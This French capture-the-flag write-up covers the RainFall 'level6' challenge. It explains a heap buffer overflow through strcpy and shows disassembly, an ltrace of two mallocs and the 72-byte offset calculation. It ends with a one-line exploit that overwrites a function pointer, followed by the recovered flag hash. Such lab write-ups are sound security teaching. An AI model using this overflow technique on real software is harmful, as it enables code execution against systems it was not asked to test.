On remarque, qu'il y a un appel de fonction de eax. L'on essaie donc de modifier la valeur de eax se situant à 0x18(%esp) soit le deuxième malloc.

```asm
 80484ca:	8b 44 24 18          	mov    0x18(%esp),%eax
 80484d0:	ff d0                	call   *%eax
```

Nous remarquons également l'utilisation d'un strcpy, vulnérable aux buffer overflow, qui copie à 0x1c(%esp) soit le premier malloc. L'on à donc besoin d'avoir l'offset séparant le premier malloc du deuxième malloc.

```bash
level6@RainFall:~$ ltrace ./level6 
__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                              = 0x0804a008
malloc(4)                                                               = 0x0804a050
strcpy(0x0804a008, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

```python
level6@RainFall:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0804a050 - 0x0804a008
72
```

Ensuite, il nous suffit de mettre la valeur de eax (0x18(%esp)) l'adresse de la fonction `n`;

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
